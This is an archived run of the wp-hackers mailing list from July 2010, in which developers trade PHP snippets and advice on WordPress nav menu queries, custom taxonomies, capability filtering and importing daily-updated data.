> Let me know if this is ultimately what you want (I know it's better to use the WordPress API, but we'll get there...)
> 
> -Mike
> 
>  
> 


From lox.dev at knc.nc  Wed Jul 28 02:36:24 2010
From: lox.dev at knc.nc (Lox)
Date: Wed, 28 Jul 2010 13:36:24 +1100
Subject: [wp-hackers] Select pages's associated menu items in a specific
	menu
In-Reply-To: <CB8F747A-25BD-4640-ADDE-FEEE9F3D8A64@newclarity.net>
References: <AANLkTim_t8Budmagvo5t2v+jzHUSN+uhkxvPeTMagVGS@mail.gmail.com> 
	<DFCEF127-050D-449E-AC1A-1F803E922ED9@newclarity.net>
	<AANLkTi=i1AC--WpuHWsO95+7PDHAdd7vDZAMgDYCzxDU@mail.gmail.com> 
	<8F9C55CB-E24F-479F-BB58-BB5ACA8F50AB@newclarity.net>
	<AANLkTineqqdhg9B9UKbZakaqQ0TGGpC+CXzGS1NeVxGb@mail.gmail.com> 
	<E54A226D-0B67-4A6A-AEAF-6ABE5C4057EE@newclarity.net>
	<CB8F747A-25BD-4640-ADDE-FEEE9F3D8A64@newclarity.net>
Message-ID: <AANLkTimjUYEBrta7_tcGNKwCbJf_bg3hJH16g5HjhUhi@mail.gmail.com>

Yeah! Thks a lot. The fields I was missing were:

'taxonomy'    => 'nav_menu',
'term'        => $term->slug

Why can't I query for the term_id directly ?
It will save the "$term = get_term($menu_id, 'nav_menu')" query ....

2010/7/28 Mike Schinkel <mikeschinkel at newclarity.net>:
> Lox,
>
> Assuming I got the previous SQL correct I think this is what you are looking for:
>
> http://gist.github.com/493195
>
> The core of that code is here:
>
> /* --------------------------- */
> $post_id = $_GET['post'];
> $menu_id = $_GET['menu'];
>
> $term = get_term($menu_id, 'nav_menu');
>
> $menu_items = new WP_Query(
> ? ? ? ?array(
> ? ? ? ? ? ? ? ?'post_type' ? => 'nav_menu_item',
> ? ? ? ? ? ? ? ?'post_status' => 'any',
> ? ? ? ? ? ? ? ?'meta_key' ? ?=> '_menu_item_object_id',
> ? ? ? ? ? ? ? ?'meta_value' ?=> $post_id,
> ? ? ? ? ? ? ? ?'showposts' ? => -1,
> ? ? ? ? ? ? ? ?'taxonomy' ? ?=> 'nav_menu',
> ? ? ? ? ? ? ? ?'term' ? ? ? ?=> $term->slug,
> ? ? ? ?)
> );
> /* --------------------------- */
>
> The key thing to notice is that the menu item post records were related both via post meta (which you figured out) but also via the "nav_menu" taxonomy by term slug (which you hadn't included.) ?At first I thought it wasn't going to be possible to do it with WP_Query() but after inspecting the SQL I wrote I realized it was indeed possible, at least what I understood that you needed.
>
> Hope this helps.
>
> -Mike
>
>
> On Jul 27, 2010, at 10:02 PM, Mike Schinkel wrote:
>
>> On Jul 27, 2010, at 8:14 PM, Lox wrote:
>>> 2010/7/28 Mike Schinkel <mikeschinkel at newclarity.net>:
>>>> So do you mean you have menus where a post may be referenced several times
>>>
>>> Sure, but the problem is with posts that may be referenced several
>>> times IN MULTIPLE MENUS.
>>
>> I just wanted to understand what your requirements were. ?(BTW, do you frequently have menu options that point to the same post? Hmm..)
>>
>> I was struggling with what you wanted and also with the solution for what I think you are looking for so I decided to do it in "my native language" first, which would be SQL. :)
>>
>> Can you verify that this gives you the results you are looking for?
>>
>> http://gist.github.com/493178
>>
>> Copy the raw file to test.php in the root of your site and call it like this (replacing the URL params with your values of course):
>>
>> http://example.com/test.php?menu=3&post=2
>>
>> Let me know if this is ultimately what you want (I know it's better to use the WordPress API, but we'll get there...)
>>
>> -Mike
>>
>>
>>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Lox
lox.dev at knc.nc

From mikeschinkel at newclarity.net  Wed Jul 28 02:48:43 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 27 Jul 2010 22:48:43 -0400
Subject: [wp-hackers] Select pages's associated menu items in a specific
	menu
In-Reply-To: <AANLkTimjUYEBrta7_tcGNKwCbJf_bg3hJH16g5HjhUhi@mail.gmail.com>
References: <AANLkTim_t8Budmagvo5t2v+jzHUSN+uhkxvPeTMagVGS@mail.gmail.com>
	<DFCEF127-050D-449E-AC1A-1F803E922ED9@newclarity.net>
	<AANLkTi=i1AC--WpuHWsO95+7PDHAdd7vDZAMgDYCzxDU@mail.gmail.com>
	<8F9C55CB-E24F-479F-BB58-BB5ACA8F50AB@newclarity.net>
	<AANLkTineqqdhg9B9UKbZakaqQ0TGGpC+CXzGS1NeVxGb@mail.gmail.com>
	<E54A226D-0B67-4A6A-AEAF-6ABE5C4057EE@newclarity.net>
	<CB8F747A-25BD-4640-ADDE-FEEE9F3D8A64@newclarity.net>
	<AANLkTimjUYEBrta7_tcGNKwCbJf_bg3hJH16g5HjhUhi@mail.gmail.com>
Message-ID: <DAD64A50-0B56-44B5-AFC2-35A4D3183EB3@newclarity.net>

On Jul 27, 2010, at 10:36 PM, Lox wrote:
> Yeah! Thks a lot. The fields I was missing were:

You are welcome.

> 'taxonomy'    => 'nav_menu',
> 'term'        => $term->slug
> 
> Why can't I query for the term_id directly ?

Because you can't.  :)

> It will save the "$term = get_term($menu_id, 'nav_menu')" query ....

I agree. Submit a ticket on trac.

-Mike

From lox.dev at knc.nc  Wed Jul 28 03:14:27 2010
From: lox.dev at knc.nc (Lox)
Date: Wed, 28 Jul 2010 14:14:27 +1100
Subject: [wp-hackers] Select pages's associated menu items in a specific
	menu
In-Reply-To: <DAD64A50-0B56-44B5-AFC2-35A4D3183EB3@newclarity.net>
References: <AANLkTim_t8Budmagvo5t2v+jzHUSN+uhkxvPeTMagVGS@mail.gmail.com> 
	<DFCEF127-050D-449E-AC1A-1F803E922ED9@newclarity.net>
	<AANLkTi=i1AC--WpuHWsO95+7PDHAdd7vDZAMgDYCzxDU@mail.gmail.com> 
	<8F9C55CB-E24F-479F-BB58-BB5ACA8F50AB@newclarity.net>
	<AANLkTineqqdhg9B9UKbZakaqQ0TGGpC+CXzGS1NeVxGb@mail.gmail.com> 
	<E54A226D-0B67-4A6A-AEAF-6ABE5C4057EE@newclarity.net>
	<CB8F747A-25BD-4640-ADDE-FEEE9F3D8A64@newclarity.net> 
	<AANLkTimjUYEBrta7_tcGNKwCbJf_bg3hJH16g5HjhUhi@mail.gmail.com> 
	<DAD64A50-0B56-44B5-AFC2-35A4D3183EB3@newclarity.net>
Message-ID: <AANLkTinNcKKyTvmgEWxdKweC2MifRUs4TzUGto62UUYa@mail.gmail.com>

>> Why can't I query for the term_id directly ?
>
> Because you can't. ?:)
>
>> It will save the "$term = get_term($menu_id, 'nav_menu')" query ....
>
> I agree. Submit a ticket on trac.

I'll do thks bro.

-- 
Lox
lox.dev at knc.nc

From peter.westwood at ftwr.co.uk  Wed Jul 28 06:44:36 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 28 Jul 2010 07:44:36 +0100
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>
Message-ID: <2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>


On 27 Jul 2010, at 23:40, Ryan Bilesky wrote:

> Thanks for the ideas.  I'll try them if I can figure out how, neither is all
> that well documented in the codex, just red links to non existant pages.
> But i'll see if I can figure it out.
> 
> 

It would be great if you could add some documentation to the codex when you have worked out what works best if you have the time.

Then the next person will be able to benefit from the journey of discovery you have been on.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From rbilesky at gmail.com  Wed Jul 28 06:58:35 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Tue, 27 Jul 2010 23:58:35 -0700
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>
	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
Message-ID: <AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>

That would defiantly depend on if I can figure this out.

On Tue, Jul 27, 2010 at 11:44 PM, Peter Westwood
<peter.westwood at ftwr.co.uk>wrote:

>
> On 27 Jul 2010, at 23:40, Ryan Bilesky wrote:
>
> > Thanks for the ideas.  I'll try them if I can figure out how, neither is
> all
> > that well documented in the codex, just red links to non existant pages.
> > But i'll see if I can figure it out.
> >
> >
>
> It would be great if you could add some documentation to the codex when you
> have worked out what works best if you have the time.
>
> Then the next person will be able to benefit from the journey of discovery
> you have been on.
>
> Cheers
> --
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From rbilesky at gmail.com  Wed Jul 28 07:29:15 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Wed, 28 Jul 2010 00:29:15 -0700
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>
	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>
Message-ID: <AANLkTiktBamO2yo5Jvf2uhoO-i3pbJQMNefeoC-Xb6-c@mail.gmail.com>

Ok so heres my problem.  I am new to wordpress so please bear with me.

I have an idea of how this works, I just am not quite sure how to turn that
into the actual finished code.

Correct me if I am wrong but this is the way I see it.

Wordpress executes current_user_can(), I capture the the result that would
send my adding a filter for "user_has_cap" and I have a function that would
decide on the final response retuened via current_user_can.  I would start
off by having it return false if wordpresses reponse is false.  If
wordpresses reponse is true, and if it is one of the capabilities I care
about I say if the current user id == 1 return true, else return false.

Thats my Psudo code based on my understanding on how this is going to work.
So heres my thing, assuming I got that part of it right, how would I start
off the function, what arguments would it receive and in what order to tell
me what capability is being tested and what WordPresses reponse was.

On Tue, Jul 27, 2010 at 11:58 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> That would defiantly depend on if I can figure this out.
>
>
> On Tue, Jul 27, 2010 at 11:44 PM, Peter Westwood <
> peter.westwood at ftwr.co.uk> wrote:
>
>>
>> On 27 Jul 2010, at 23:40, Ryan Bilesky wrote:
>>
>> > Thanks for the ideas.  I'll try them if I can figure out how, neither is
>> all
>> > that well documented in the codex, just red links to non existant pages.
>> > But i'll see if I can figure it out.
>> >
>> >
>>
>> It would be great if you could add some documentation to the codex when
>> you have worked out what works best if you have the time.
>>
>> Then the next person will be able to benefit from the journey of discovery
>> you have been on.
>>
>> Cheers
>> --
>> Peter Westwood
>> http://blog.ftwr.co.uk | http://westi.wordpress.com
>> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From dan at dansmart.co.uk  Wed Jul 28 07:36:45 2010
From: dan at dansmart.co.uk (Dan Smart)
Date: Wed, 28 Jul 2010 08:36:45 +0100
Subject: [wp-hackers] Best format for regularly updated data
In-Reply-To: <AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>
Message-ID: <005801cb2e27$a21ea270$e65be750$@co.uk>

Caveat: If this isn't the best list for this, please direct me
appropriately. However, this seems a best practices question, which is why I
directed it here for the moment.

Background:
I have a project where a significant amount data is regularly updated once a
day (database file is FTP'd across once a day). This part is out of our
control. This information (a college's course data) needs to be browsable as
pages in the CMS, and searchable also.

If it was not regularly updated data, I would simply implement this as a
number of pages in WP. However, I'll be running a daily cron job
(wp_schedule_event) to import the data, so have to deal with regularly
replaced data.

My query:
Has anyone experience of this sort of issue? What's the best way to handle
such data?

There seems to be two approaches to me in the plugin development:

1) The plugin imports to a db table of its own, and displays the 'pages'
itself, managing the rewrite rules to display the appropriate content.

2) On the import of data, create new Wordpress Pages each time, and track
and delete the old ones (they will no longer be needed). Are there any
downsides to this regular turnover of pages?

Any thoughts?

Dan

----------------------------------------------------------------------------
---------
Dan Smart - Freelance Web Developer
Web: www.dansmart.co.uk
Follow me at: www.twitter.com/danielsmart

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Wed Jul 28 07:47:17 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 28 Jul 2010 03:47:17 -0400
Subject: [wp-hackers] Best format for regularly updated data
In-Reply-To: <005801cb2e27$a21ea270$e65be750$@co.uk>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>
	<005801cb2e27$a21ea270$e65be750$@co.uk>
Message-ID: <3E70F50F-DCD6-48E7-9C08-7E95812041CF@newclarity.net>

On Jul 28, 2010, at 3:36 AM, Dan Smart wrote:
> 1) The plugin imports to a db table of its own, and displays the 'pages'
> itself, managing the rewrite rules to display the appropriate content.
> 
> 2) On the import of data, create new Wordpress Pages each time, and track
> and delete the old ones (they will no longer be needed). Are there any
> downsides to this regular turnover of pages?

Why can't you use option #3, update the existing pages?  (actually, you'd almost certainly want to use custom post types instead of pages.)

-Mike

From KrisY at tbs.uk.com  Wed Jul 28 07:50:24 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Wed, 28 Jul 2010 08:50:24 +0100
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
In-Reply-To: <43A82B40-1B28-4787-B2A6-79C090FF3264@newclarity.net>
References: <mailman.11.1280145602.13432.wp-hackers@lists.automattic.com><AANLkTinuEOPfaH+Rn4TQs4id7GehgrJA0t4OPgvWfae2@mail.gmail.com><CD47955B7E065D48AB5CF226C2ED75C02E31A7@tbs-sbs01.TBS.local><C4C7D49E-330F-4985-8A56-18758CA63670@newclarity.net>
	<43A82B40-1B28-4787-B2A6-79C090FF3264@newclarity.net>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E31BE@tbs-sbs01.TBS.local>

This seems to work. I need to test it a little more (and handle for no
results) but at first impressions, this is exactly it.

Thanks a lot Mike!

Kris

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mike
Schinkel
Sent: 26 July 2010 22:26
To: wp-hackers
Subject: Re: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101

Oops, I meant to include this link to a standalone file that you can
download to your website root to demonstrate this with your own
post_type and taxonomy:

http://gist.github.com/491202

-Mike

On Jul 26, 2010, at 4:56 PM, Mike Schinkel wrote:

> Hi Kris:
> 
> I was intrigued to find a solution for "taxonomy=clients" and
"term=any" where "any" is a wildcard (WP_Query() supports "any" as a
wildcard for post_types but not for terms of a taxonomy.)
> 
> Here's a hook that adds an "any" wildcard for terms for a taxonomy
assuming some other plugin didn't muck with the " AND 0 " inserted into
the WHERE clause when a taxonomy term doesn't match:
> 
> add_action('posts_where','my_posts_where',10,2);
> 
> function my_posts_where($where,$query) {
> 	if (isset($query->query_vars['taxonomy']) &&
$query->query_vars['term']=='any') {
> 		global $wpdb;
> 		$tt = $wpdb->term_taxonomy;
> 		$tr = $wpdb->term_relationships;
> 		$where .= $wpdb->prepare(" AND {$wpdb->posts}.ID IN (
> 						SELECT object_id FROM
$tr
> 						INNER JOIN $tt ON
$tt.term_taxonomy_id = $tr.term_taxonomy_id
> 						WHERE $tt.taxonomy=%s)
",$query->query_vars['taxonomy']);
> 		$where = str_replace(' AND 0 ','',$where);
> 	}
> 	return $where;
> }
> 
> Your query for this would look like this:
> 
> $posts = new
WP_Query("post_type=portfolio_item&taxonomy=clients&term=any&posts_per_p
age=-1");
> 
> Or like this:
> 
> $posts = new WP_Query(array(
> 	'post_type' => 'portfolio_item',
> 	'taxonomy' => 'clients',
> 	'term' => 'any',
> 	'posts_per_page' => -1,
> ));
> 
> It works but unfortunately it's not very robust because of the need to
remove the " AND 0 " from the WHERE clause because there are other
reasons get_posts() adds " AND 0 ".  If query natively supported
"term=any" or at least if there was a hook in /wp-includes/query.php
(lines 2049 and 2068) that allowed us to target this specifically it
might be better; if any of the core team agree I'll add a ticket to
trac.
> 
> Alternate, maybe someone else knows a better way I didn't discover?
> 
> -Mike
> 
> 
> On Jul 26, 2010, at 10:53 AM, Kris Young wrote:
> 
>> I was as nice as I could be in my original mail without getting
>> frustrated - it really helps though that someone else is having the
same
>> problem though. I honestly think this whole process was a lot more
>> complicated than it should have been.
>> 
>> Thanks for your solution - I will do my best to take a look at it
today,
>> and will let you know when I make some progress. Thanks again, and
also
>> to Mike Schinkel for the same.
>> 
>> Kris
>> 
>> -----Original Message-----
>> From: wp-hackers-bounces at lists.automattic.com
>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Jared
>> Williams
>> Sent: 26 July 2010 14:23
>> To: wp-hackers at lists.automattic.com
>> Subject: Re: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
>> 
>> I have a wp_nav_menu, and it has two top level pages that have a
bunch
>> of
>> terms I've created for two custom taxonomies, which are for the two
top
>> level pages. I'm trying to figure out how I can hide the terms from
the
>> drop
>> down menu I made that shows the terms, if there are no posts assigned
to
>> a
>> term of the taxonomies. Is this possible? It doesn't seem like it is.
>> 
>> 
>> As for Kris Young's question about showing all posts of a taxonomy,
this
>> is
>> a problem I ran into as well, and searched for a long time and found
it
>> very
>> hard to figure out.
>> 
>> What I managed to do is list all terms for a taxonomy, and all the
posts
>> for
>> each term individually. You may be able to hack this to do what
you're
>> trying to do since it is the same as what I needed to do I just
didn't
>> have
>> time to make it list only the posts for the taxonomy.
>> 
>> 
>> <?php
>> // Create list of taxonomy terms and list the posts under each term
>> $post_type = 'post';
>> $tax = 'your_custom_taxonomy';
>> $tax_terms = get_terms( $tax );
>> if ($tax_terms) {
>>   foreach ($tax_terms  as $tax_term) {
>>   $args = array(
>>       'post_type' => $post_type,
>>       "tax" => $tax_term->slug,
>>       'post_status' => 'publish',
>>       'posts_per_page' => -1,
>>       'caller_get_posts'=> 1
>>   );
>> 
>>       $my_query = null;
>>       $my_query = new WP_Query($args);
>> 
>>       if( $my_query->have_posts() ) : ?>
>> 
>>           <h2 class="breadcrumb">All <?php echo $tax; ?> Posts For
>> <?php
>> echo $tax_term->name; ?></h2>
>>           <ul class="taxlist">
>>           <?php while ( $my_query->have_posts() ) :
>> $my_query->the_post();
>> ?>
>> 
>>               <li id="post-<?php the_ID(); ?>">
>>                   <a href="<?php the_permalink(); ?>" rel="bookmark"
>> title="Permanent Link to <?php the_title_attribute(); ?>"><?php
>> the_title();
>> ?></a>
>>               </li>
>> 
>> 
>>           <?php endwhile; // end of loop ?>
>>           </ul>
>> 
>>           <?php if( function_exists('wp_pagenavi')) { wp_pagenavi();
}
>> else { ?>
>>               <div class="navigation clearfix">
>>                   <div class="alignleft"><?php
>> next_posts_link('&laquo;
>> Previous Entries') ?></div>
>>                   <div class="alignright"><?php
>> previous_posts_link('Next
>> Entries &raquo;') ?></div>
>>               </div>
>>           <?php } ?>
>> 
>>       <?php else : ?>
>> 
>>           <h2 class="title">Oops</h2>
>>           <p>Looks like something is missing...</p>
>> 
>>       <?php endif; // if have_posts()
>>       wp_reset_query();
>> 
>>   } // end foreach #tax_terms
>> }
>> ?>
>> 
>> Hope this helps.
>> 
>> Jared Williams
>> 
>> 
>> On Mon, Jul 26, 2010 at 8:00 AM,
>> <wp-hackers-request at lists.automattic.com>wrote:
>> 
>>> Send wp-hackers mailing list submissions to
>>>      wp-hackers at lists.automattic.com
>>> 
>>> To subscribe or unsubscribe via the World Wide Web, visit
>>>      http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> or, via email, send a message with subject or body 'help' to
>>>      wp-hackers-request at lists.automattic.com
>>> 
>>> You can reach the person managing the list at
>>>      wp-hackers-owner at lists.automattic.com
>>> 
>>> When replying, please edit your Subject line so it is more specific
>>> than "Re: Contents of wp-hackers digest..."
>>> 
>>> 
>>> Today's Topics:
>>> 
>>> 1. Re: Custom post types - a multitude of problems (Mike Schinkel)
>>> 2. Querying posts of another WordPress install (Ashish Saini)
>>> 3. Re: Querying posts of another WordPress install (Ashish Saini)
>>> 4. Re: Querying posts of another WordPress install (Aaron Jorbin)
>>> 
>>> 
>>>
----------------------------------------------------------------------
>>> 
>>> Message: 1
>>> Date: Mon, 26 Jul 2010 06:06:14 -0400
>>> From: Mike Schinkel <mikeschinkel at newclarity.net>
>>> Subject: Re: [wp-hackers] Custom post types - a multitude of
problems
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID: <F70451A1-2EFF-4911-BD5C-ACC86CF452E7 at newclarity.net>
>>> Content-Type: text/plain;       charset=us-ascii
>>> 
>>> On Jul 26, 2010, at 5:20 AM, Kris Young wrote:
>>>> I need to output the contents (all posts, all content of those
>> posts) of
>>>> a specific custom category (taxonomy) and I have no idea how to get
>> it
>>>> done. All I want is a page that outputs all the posts for a certain
>>>> category (and that category only) that I created using this code:
>>>> 
>>>> register_taxonomy("clients", array("portfolio_item"),
>>>> array("hierarchical" => true, "label" => "Clients",
"singular_label"
>> =>
>>>> "Client", "rewrite" => array('slug'=>'portfolio_item')));
>>>> 
>>>> Yes, that part was simple, but for some reason my custom taxonomy
is
>>>> completely separate from the rest of the site and irretrievable.
>> Can't
>>>> figure out for the life of me how to do this.
>>> 
>>> To start, I think you have your taxonomy registration wrong. (FWIW
my
>>> preference would be to go with a singular for the taxonomy name,
e.g.
>>> "client" but I'll leave yours as is):
>>> 
>>> $labels = array(
>>>  'name' => _x( 'Clients', 'taxonomy general name' ),
>>>  'singular_name' => _x( 'Client', 'taxonomy singular name' ),
>>>  'search_items' =>  __( 'Search Clients' ),
>>>  'all_items' => __( 'All Clients' ),
>>>  'parent_item' => __( 'Parent Client' ),
>>>  'parent_item_colon' => __( 'Parent Client:' ),
>>>  'edit_item' => __( 'Edit Client' ),
>>>  'update_item' => __( 'Update Client' ),
>>>  'add_new_item' => __( 'Add New Client' ),
>>>  'new_item_name' => __( 'New Client Name' ),
>>> );
>>> 
>>> register_taxonomy("clients", array("portfolio_item"),array(
>>>      "hierarchical" => true,
>>>      "labels" => $labels,
>>>      "public" => true,
>>>      "show_ui" => true,
>>>      "query_var" => "clients",
>>>      "rewrite" => array('slug'=>'client'),
>>> ));
>>> 
>>> Many of these options will default but I went ahead and listed them
>> all.
>>> Read more here:
>>> 
>>> http://codex.wordpress.org/Function_Reference/register_taxonomy
>>> 
>>> As for the rest of your question, I'm unclear.  Do you want all
>> Portfolio
>>> Items that have *any* clients, or a specific client?  For a specific
>> client
>>> i.e. "john-smith" I think this would be what you need (though I
>> haven't run
>>> the code so it may have typos):
>>> 
>>> <?php
>>> $portfolio_items = new
>>> 
>>
WP_Query('post_type=portfolio_item&taxonomy=clients&term=john-smith&post
>> s_per_page=-1');
>>> if ( $portfolio_items->have_posts() ):
>>>      while ( $portfolio_items->have_posts() ) :
>>> $portfolio_items->the_post(); ?>
>>>              <h2 id="post-<?php the_ID(); ?>" <?php post_class();
>>> ?>><?php the_title(); ?></h2>
>>>              <?php the_content();
>>>      endwhile;
>>> endif;
>>> 
>>> If you want to get all portfolio items that have *any* clients I've
>>> actually not done that before so I'll have to let someone else
answer.
>>> 
>>> HTH.
>>> 
>>> -Mike
>>> 
>>> ------------------------------
>>> 
>>> Message: 2
>>> Date: Mon, 26 Jul 2010 17:08:30 +0530
>>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>>> Subject: [wp-hackers] Querying posts of another WordPress install
>>> To: wp-hackers <wp-hackers at lists.automattic.com>
>>> Message-ID:
>>>      <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>> 
>>> Hi,
>>> 
>>> Is there any way that I can query posts from another WordPress
install
>>> residing in the same database? I know it can be done via SQL queries
>> but is
>>> there any workaround hacking my way along with API?
>>> 
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>> : http://twitter.com/ashfame
>>> 
>>> 
>>> ------------------------------
>>> 
>>> Message: 3
>>> Date: Mon, 26 Jul 2010 17:12:22 +0530
>>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>>> Subject: Re: [wp-hackers] Querying posts of another WordPress
install
>>> To: wp-hackers <wp-hackers at lists.automattic.com>
>>> Message-ID:
>>>      <AANLkTimmte-eFUkmk2w3KsaZpWkHCKtD=pxU4OnPj0XA at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>> 
>>> I think this can be done with the help of setup_postdata() by
>> populating
>>> the
>>> fields as explained here -
>>> 
>>
http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>>> 
>>> Right? And is this the best approach?
>>> 
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>> : http://twitter.com/ashfame
>>> 
>>> 
>>> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
>>> <ashishsainiashfame at gmail.com>wrote:
>>> 
>>>> Hi,
>>>> 
>>>> Is there any way that I can query posts from another WordPress
>> install
>>>> residing in the same database? I know it can be done via SQL
queries
>> but
>>> is
>>>> there any workaround hacking my way along with API?
>>>> 
>>>> Thanks & Regards
>>>> Ashish Saini aka Ashfame
>>>> (Deserve Before You Desire)
>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com
|
>>>> Twitter : http://twitter.com/ashfame
>>>> 
>>> 
>>> 
>>> ------------------------------
>>> 
>>> Message: 4
>>> Date: Mon, 26 Jul 2010 07:56:17 -0400
>>> From: Aaron Jorbin <aaron at jorb.in>
>>> Subject: Re: [wp-hackers] Querying posts of another WordPress
install
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID:
>>>      <AANLkTin6x+4NT6E6bxR=1Xq43D6txPhT0et2xnK_45Nt at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>> 
>>> Is this using Multisite?  If so, you can use switch_to_blog -
>>> http://codex.wordpress.org/WPMU_Functions/switch_to_blog and it's
>>> counterpart restore_current_blog -
>>> http://codex.wordpress.org/WPMU_Functions/restore_current_blog to
move
>>> around use the api.
>>> 
>>> 
>>> 
>>> http://aaron.jorb.in
>>> twitter: twitter.com/aaronjorbin
>>> 
>>> 
>>> On Mon, Jul 26, 2010 at 7:42 AM, Ashish Saini
>>> <ashishsainiashfame at gmail.com>wrote:
>>> 
>>>> I think this can be done with the help of setup_postdata() by
>> populating
>>>> the
>>>> fields as explained here -
>>>> 
>>
http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>>>> 
>>>> Right? And is this the best approach?
>>>> 
>>>> Thanks & Regards
>>>> Ashish Saini aka Ashfame
>>>> (Deserve Before You Desire)
>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com
|
>>>> Twitter
>>>> : http://twitter.com/ashfame
>>>> 
>>>> 
>>>> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
>>>> <ashishsainiashfame at gmail.com>wrote:
>>>> 
>>>>> Hi,
>>>>> 
>>>>> Is there any way that I can query posts from another WordPress
>> install
>>>>> residing in the same database? I know it can be done via SQL
>> queries
>>> but
>>>> is
>>>>> there any workaround hacking my way along with API?
>>>>> 
>>>>> Thanks & Regards
>>>>> Ashish Saini aka Ashfame
>>>>> (Deserve Before You Desire)
